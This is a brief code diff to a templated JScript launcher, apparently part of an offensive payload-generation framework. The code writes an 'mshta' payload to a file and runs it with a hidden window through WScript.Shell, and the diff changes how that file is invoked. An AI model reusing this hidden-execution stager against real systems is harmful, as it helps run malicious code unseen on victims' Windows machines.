@@ -42,7 +42,7 @@ function main(){
     var fd = {{variables['file-system-object'][0]}}.CreateTextFile(path);
     fd.WriteLine(mshta);
     fd.close();
-    {{variables['wscript.shell'][0]}}.run("mshta " + path, 0, false);
+    {{variables['wscript.shell'][0]}}.run(path, 0, false);
     var now = new Date().getTime();
     while((new Date().getTime() - now) < 5000){
       // do nothing
